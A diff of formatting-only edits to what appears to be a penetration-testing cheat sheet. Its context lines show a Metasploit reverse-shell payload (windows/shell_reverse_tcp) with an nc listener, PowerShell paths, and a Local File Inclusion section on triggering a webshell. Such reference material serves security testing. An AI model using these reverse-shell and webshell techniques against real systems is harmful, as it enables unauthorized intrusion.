@@ -141,7 +141,7 @@ msfdb reinit  <br />
 cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />
 
 <br />
-<br />
+
 ## Windows Shell
 ```sh 
 //Non-Staged :  (windows/shell_reverse_tcp) && nc -nlvp 443
@@ -178,8 +178,8 @@ Powershell location<br />
 -64-bit (x64) Powershell executable C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe  
 ```
 
-
-## Local File Inclusion (LFI)
+<br />
+## Local File Inclusion (LFI) 
 Put files locally on the target and trigger webshell by browsing the page. <br />
 ```sh 
 http://target.com/?page=home
